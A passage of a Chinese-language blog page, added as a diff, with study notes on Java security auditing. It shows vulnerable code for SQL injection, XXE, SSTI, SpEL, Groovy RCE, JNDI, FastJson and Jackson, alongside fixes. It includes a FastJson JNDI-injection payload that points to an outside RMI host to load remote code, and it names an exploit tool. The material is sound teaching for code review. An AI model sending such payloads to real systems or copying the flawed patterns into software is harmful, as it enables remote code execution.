@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+        <title>JAVA安全</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="manifest" href="/site.webmanifest">
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Hexo</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Hexo</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                <h4>John Doe</h4>
+                <img class="al_sidebar_avatar" src="https://yourAvatorURL">
+                <p></p>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        JAVA安全
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            Sat January 20, 2024 09:35 AM
+                        </div>
+
+                        
+
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E"><span class="toc-text">基础漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDBC"><span class="toc-text">JDBC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Statement"><span class="toc-text">Statement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PrepareStatement"><span class="toc-text">PrepareStatement</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MyBatis"><span class="toc-text">MyBatis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-text">漏洞发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E6%B3%A8%E5%85%A5"><span class="toc-text">XXE注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%B3%A8%E5%85%A5"><span class="toc-text">SSTI注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPEL%E6%B3%A8%E5%85%A5"><span class="toc-text">SPEL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce"><span class="toc-text">rce</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">其他漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI"><span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI"><span class="toc-text">RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP"><span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="toc-text">判断漏洞存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%BB%84%E4%BB%B6"><span class="toc-text">不安全组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson"><span class="toc-text">FastJson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jackson"><span class="toc-text">Jackson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro"><span class="toc-text">Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j"><span class="toc-text">Log4j</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream"><span class="toc-text">XStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AE%E5%AE%A1%E8%AE%A1"><span class="toc-text">真实项目审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">JAVA反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readObject"><span class="toc-text">readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLDecoder"><span class="toc-text">XMLDecoder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SnakeYaml"><span class="toc-text">SnakeYaml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpringBoot%E6%A1%86%E6%9E%B6"><span class="toc-text">SpringBoot框架</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-1"><span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%AE%89%E5%85%A8"><span class="toc-text">泄漏安全</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8"><span class="toc-text">漏洞安全</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Druid%E7%9B%91%E6%8E%A7"><span class="toc-text">Druid监控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Swagger"><span class="toc-text">Swagger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT"><span class="toc-text">JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT%E7%89%B9%E5%BE%81"><span class="toc-text">JWT特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT%E8%AF%86%E5%88%AB"><span class="toc-text">JWT识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-text">攻击利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E7%9B%92JWT%E6%B5%8B%E8%AF%95"><span class="toc-text">黑盒JWT测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%A2%E8%AF%95%E9%97%AE%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%B8%E8%A7%81%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95"><span class="toc-text">面试问不回显常见判断方法</span></a></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h1 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h1><p>这些漏洞大多是所有语言共有的，漏洞原理、漏洞利用和php的一样，只是形成漏洞的代码不同，这里就学习下java里产生漏洞的代码。</p>
+<p>这些漏洞检测黑盒方法和php相同，白盒就全局搜索产生漏洞的函数或者特征</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h3><p>JDBC是执行sql语句的java接口。不同厂商用的数据库不同，有mysql也有oracle等，一个应用程序如果原本使用的是mysql数据库，他想改成oracle数据库的话，代码改动会非常大，有了jdbc后，程序员就只需要调用jdbc，jdbc自己会向不同数据库联系，使得代码适用性更强</p>
+<p>JDBC有两个方法执行SQL语句，分别是Statement和PrepareStatement。</p>
+<h4 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h4><p>不安全代码例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public String vul1(String id) &#123;</span><br><span class="line">    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);  //加载MySQL的JDBC驱动</span><br><span class="line">    Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);  //使用DriverManager连接数据库</span><br><span class="line"></span><br><span class="line">    Statement stmt = conn.createStatement();  //建立可以连接数据库进行操作的Statement对象</span><br><span class="line">    String sql = &quot;select * from users where id = &#x27;&quot; + id + &quot;&#x27;&quot;;</span><br><span class="line">    ResultSet rs = stmt.executeQuery(sql);  //使用Statement对象（executeQuery）执行SQL查询</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就完全没有过滤用户输入的id内容，导致sql注入，可以使用过滤的方式，但是效果没有下面的那种预编译好</p>
+<h4 id="PrepareStatement"><a href="#PrepareStatement" class="headerlink" title="PrepareStatement"></a>PrepareStatement</h4><p>不安全代码例子：</p>
+<figure class="highlight plaintext"><figcaption><span>String vul2(String id) &#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public String vul2(String id) &#123;</span><br><span class="line">    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">    Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line">    String sql = &quot;select * from users where id = &quot; + id;</span><br><span class="line">    PreparedStatement st = conn.prepareStatement(sql);  //建立可以连接数据库进行操作的PreparedStatement对象</span><br><span class="line">    ResultSet rs = st.executeQuery();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PreparedStatement和Statement的区别就是前者有进行预编译</p>
+<p><strong>预编译</strong>：是指在应用程序运行前，将SQL语句事先进行解析、编译和优化，并生成可执行的二进制代码。（我感觉就像是把sql语句编写成一个函数，然后id作为函数的参数当做一个字符串传进来运行的那种意思，同样在同时执行多个id的查找时，速度会更快，因为不要再解析命令了）</p>
+<p>上面那个代码的问题是直接拼接字符串，而没有使用占位符，这样做的结果会把整个语句加上参数id一起预编译，起不了效果，传<code>1 or 1=1</code>后依然是<code>select * from users where id = 1 or 1=1</code></p>
+<p>正确代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public String safe1(String id) &#123;</span><br><span class="line">    String sql = &quot;select * from users where id = ?&quot;;</span><br><span class="line">    PreparedStatement st = conn.prepareStatement(sql);</span><br><span class="line">    st.setString(1, id);</span><br><span class="line">    ResultSet rs = st.executeQuery();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样传进去<code>1 or 1=1</code>的结果会变成<code>select * from users where id = &#39;1 or 1=1&#39;</code>，就不会产生sql注入了</p>
+<h3 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h3><p>MyBatis的作用和jdbc是一样的，相当于简化并优化后的jdbc。MyBatis支持两种参数符号，一种是#，另一种是$，#使用预编译，$使用拼接SQL。漏洞成因也和jdbc差不多，都是直接拼接了sql</p>
+<p><strong>order by注入</strong>：由于使用#{}会将对象转成字符串，形成order by “user” desc造成错误，因此很多研发会采用${}来解决，从而造成注入.</p>
+<p>错误写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from users order by $&#123;field&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>like 注入</strong>：模糊搜索时，直接使用’%#{q}%’ 会报错，部分研发图方便直接改成’%${q}%’从而造成注入.</p>
+<p>错误写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;Select * from users where username like &#x27;%$&#123;username&#125;%&#x27;&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>in注入</strong>：in之后多个id查询时使用 # 同样会报错</p>
+<p>错误写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;Select * from users where id in ($&#123;ids&#125;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>正确写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;Select * from users where username like concat(&#x27;%&#x27;,#&#123;username&#125;, &#x27;%&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>黑盒：和php一样</p>
+<p>白盒：先看外部库里有没有引用这两个的库，如果用了MyBatis，可以全局搜索上面错误写法的特征：<code>$&#123;</code>，<code>%$&#123;</code>，<code>($&#123;</code>，可以筛选下java和xml文件，如果是xml文件可以追踪下哪个java文件调用了这个文件</p>
+<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><p> 审计的函数：</p>
+<p> * 1. XMLReader</p>
+<p> * 2. SAXReader</p>
+<p> * 3. DocumentBuilder</p>
+<p> * 4. XMLStreamReader</p>
+<p> * 5. SAXBuilder</p>
+<p> * 6. SAXParser</p>
+<p> * 7. SAXSource</p>
+<p> * 8. TransformerFactory</p>
+<p> * 9. SAXTransformerFactory</p>
+<p> * 10. SchemaFactory</p>
+<p> * 11. Unmarshaller</p>
+<p> * 12. XPathExpression</p>
+<p>不安全代码例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public String XMLReader(@RequestParam String content) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            log.info(&quot;[vul] XMLReader: &quot; + content);</span><br><span class="line"></span><br><span class="line">            XMLReader xmlReader = XMLReaderFactory.createXMLReader();  //使用日志记录工具记录xml</span><br><span class="line">            // 修复：禁用外部实体</span><br><span class="line">            // xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(content)));  //使用上面创建的XML阅读器解析传入的XML内容</span><br><span class="line">            return &quot;XMLReader XXE&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h2><p>java常见模板：Velocity、Thymeleaf</p>
+<p>不安全代码例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public String thymeleafVul(@RequestParam String lang) &#123;</span><br><span class="line">    // 模版文件参数可控</span><br><span class="line">    return &quot;lang/&quot; + lang;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload可见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
+<h2 id="SPEL注入"><a href="#SPEL注入" class="headerlink" title="SPEL注入"></a>SPEL注入</h2><p>SpEL（Spring Expression Language）表达式注入, 是一种功能强大的表达式语言、用于在运行时查询和操作对象图，由于未对参数做过滤可造成任意命令执行。（相当于php中的eval，所以就把他放到基础漏洞里面了）</p>
+<p>审计的函数：</p>
+<p> * 1. SpelExpressionParser</p>
+<p> * 2. getValue</p>
+<p>不安全代码例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public String spelVul(String ex) &#123;</span><br><span class="line">    ExpressionParser parser = new SpelExpressionParser();  //创建一个新的SpelExpressionParser对象，用于解析SPL表达式。</span><br><span class="line">    String result = parser.parseExpression(ex).getValue().toString();  //使用parseExpression方法解析传入的SPL表达式。然后，通过调用getValue()方法获取表达式的值，并将其转换为字符串。</span><br><span class="line">    System.out.println(result);  //输出解析后的SPL表达式的值</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p>审计的函数：</p>
+<p>-Groovy</p>
+<p>-RuntimeExec</p>
+<p>-ProcessImpl</p>
+<p>-ProcessBuilder</p>
+<p>-ScriptEngineManager</p>
+<p>不安全代码例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class GroovyVul &#123;</span><br><span class="line">    @ApiOperation(value = &quot;vul：代码注入 - Groovy类&quot;)</span><br><span class="line">    @GetMapping(&quot;/vul&quot;)</span><br><span class="line">    public void vul(String cmd) &#123;</span><br><span class="line">        GroovyShell shell = new GroovyShell();  //创建了一个新的GroovyShell对象。</span><br><span class="line">        shell.evaluate(cmd);  //执行cmd</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h1><p>这类漏洞在黑盒里很难发现，一般都要依靠代码审计来发现</p>
+<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI是一种用于访问不同命名和目录服务的<strong>API</strong>，它可以将<strong>名称绑定到对象</strong>，然后通过<strong>名称查找对象</strong>。如果对象是一个远程对象，例如RMI或LDAP服务，那么JNDI会尝试从远程服务器加载该对象的类，并在本地执行。</p>
+<p>可以简单理解为远程文件包含，一个是远程加载php文件，一个远程加载class类</p>
+<p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p>
+<p><strong>RMI：远程方法调用注册表</strong></p>
+<p><strong>LDAP：轻量级目录访问协议</strong></p>
+<p>有点抽象，举个数据源（数据源是一个可以提供数据库连接的对象，它可以被注册到JNDI中，然后在程序中通过名称来查找和使用）的jndi例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//创建一个数据源对象 </span><br><span class="line">DataSource ds = new DataSource(); </span><br><span class="line">//设置数据源的属性 </span><br><span class="line">ds.setUrl(“jdbc:mysql://localhost:3306/mydb”); </span><br><span class="line">ds.setUsername(“root”); </span><br><span class="line">ds.setPassword(“123456”); </span><br><span class="line">//获取JNDI的初始上下文 </span><br><span class="line">Context ctx = new InitialContext(); </span><br><span class="line">//将数据源对象绑定到JNDI的名称</span><br><span class="line">jdbc/mydb ctx.bind(“jdbc/mydb”, ds);</span><br></pre></td></tr></table></figure>
+
+<p>这里有个创建上下文，他是创建一个<strong>Context</strong>对象，他的目的是可以用来查找和操作命名空间中的对象和属性，例如通过**lookup()<strong>方法根据名称获取对象的引用，或者通过</strong>bind()**方法将名称和对象绑定在一起。</p>
+<p>这样，我们就将JNDI的名称jdbc&#x2F;mydb绑定到了JNDI的对象ds上。在其他地方，我们可以通过JNDI的名称来获取数据源对象的引用，然后从中获取数据库连接，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//获取JNDI的初始上下文 </span><br><span class="line">Context ctx = new InitialContext(); </span><br><span class="line">//通过JNDI的名称查找数据源对象 </span><br><span class="line">DataSource ds = (DataSource) ctx.lookup(“jdbc/mydb”); </span><br><span class="line">//从数据源对象中获取数据库连接 </span><br><span class="line">Connection conn = ds.getConnection();</span><br></pre></td></tr></table></figure>
+
+<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI：远程方法调用注册表。</p>
+<p>举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//创建一个远程对象 </span><br><span class="line">IHello rhello = new HelloImpl(); </span><br><span class="line">//本地主机上的远程对象注册表Registry的实例，并指定端口为8888 </span><br><span class="line">LocateRegistry.createRegistry(8888); </span><br><span class="line">//把远程对象注册到RMI注册服务器上，并命名为RHello </span><br><span class="line">Naming.bind(“rmi://localhost:8888/RHello”,rhello);</span><br></pre></td></tr></table></figure>
+
+<p>这里远程对象注册表Registry的实例的作用类似于上面的创建Context对象</p>
+<p>使用时的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//在RMI注册服务器上查找名称为RHello的对象，并调用其上的方法 </span><br><span class="line">IHello rhello = (IHello)Naming.lookup(“rmi://localhost:8888/RHello”); </span><br><span class="line">String result = rhello.sayHello(); </span><br></pre></td></tr></table></figure>
+
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP：轻量级目录访问协议，是一种用于存储和查询分层结构数据的网络协议，常用于实现目录服务。通常采用类似于URL的格式，例如ldap:&#x2F;&#x2F;host:port&#x2F;dn，其中dn是对象的专有名称（感觉有一点像文件存储系统的意思）</p>
+<h3 id="判断漏洞存在"><a href="#判断漏洞存在" class="headerlink" title="判断漏洞存在"></a>判断漏洞存在</h3><p>使用dnslog，命令<code>ldap://dns地址</code>，这里只支持ldap，不支持rmi</p>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>使用工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/1.png" alt="1"></p>
+<p>他的原理就是在我们的服务器里写一个执行命令的类，然后给我们rmi或者ldap协议的代码进行调用这个类</p>
+<p>JNDI不作为漏洞本身，只作为漏洞利用途径，比如下面不安全组件全都需要依靠jndi才能进行攻击</p>
+<p>利用漏洞jdk版本限制：</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/2.png" alt="2"></p>
+<h2 id="不安全组件"><a href="#不安全组件" class="headerlink" title="不安全组件"></a>不安全组件</h2><h3 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h3><p>阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串</p>
+<p>历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=fastjson">https://avd.aliyun.com/search?q=fastjson</a></p>
+<p>漏洞原理：fastjson 在反序列化 JSON 字符串时，会根据 @type 属性来创建指定的 Java 类对象。那么攻击者可以通过构造恶意的JSON字符串，利用@type属性指定任意的类名，从而触发FastJson的反序列化漏洞，执行任意代码（详细看payload例子）</p>
+<ul>
+<li>不安全代码：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public String fastJson(@RequestBody String content) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            JSONObject jsonToObject = JSON.parseObject(content);  //使用fastjson库的parseObject方法将传入的字符串content转换成JSONObject对象。</span><br><span class="line">            return jsonToObject.get(&quot;name&quot;).toString();  //从转换后的JSON对象中获取键为&quot;name&quot;的值，并将其转换为字符串。然后返回这个字符串。</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload例子：<code>&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://81.71.103.144:1099/jkv4dp &quot;,&quot;autoCommit&quot;:true&#125;</code>，这里就会执行rmi，造成jndi注入（原因是：使用了一个存在不安全反序列化的类 com.sun.rowset.JdbcRowSetImpl，并且设置了一个恶意的 dataSourceName 属性，指向了一个远程的 RMI 服务。当 fastjson 库反序列化这段代码时，会根据类信息创建一个 JdbcRowSetImpl 对象，并调用它的 setDataSourceName 将 dataSourceName 属性赋值为rmi:&#x2F;&#x2F;81.71.103.144:1099&#x2F;jkv4dp。然后，Jackson 库会调用它的 setAutoCommit 方法，将 autoCommit 属性赋值为 true。这时，JdbcRowSetImpl 对象会尝试连接 dataSourceName 指向的 RMI 服务）</p>
+<ul>
+<li>看是否有用到这个组件及fastjson版本：在xml文件里</li>
+</ul>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/3.png" alt="3"></p>
+<p>再在阿里漏洞库中找这个版本是否存在漏洞</p>
+<h3 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h3><p>当下流行的json解释器，主要负责处理Json的序列化和反序列化。</p>
+<p>历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=Jackson">https://avd.aliyun.com/search?q=Jackson</a></p>
+<p>漏洞原理：Jackson 库在反序列化时，根据类信息创建相应的 Java 对象，那么攻击者可以通过构造恶意的JSON字符串，利用指定任意的类名，从而触发Jackson的反序列化漏洞，执行任意代码</p>
+<p>不安全代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public String vul(@RequestBody String content) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();  //创建一个新的ObjectMapper对象，这是Jackson库中用于处理JSON的核心类。</span><br><span class="line">        mapper.enableDefaultTyping();  //确保跨多个JSON文档的类型信息的一致性。</span><br><span class="line">        System.out.println(content);</span><br><span class="line">        Object o = mapper.readValue(content, Object.class);  // 使用ObjectMapper的readValue方法将传入的JSON字符串转换为Java的class类。</span><br><span class="line">        return &quot;Jackson RCE&quot;;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        return &quot;Jackson RCE ..&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
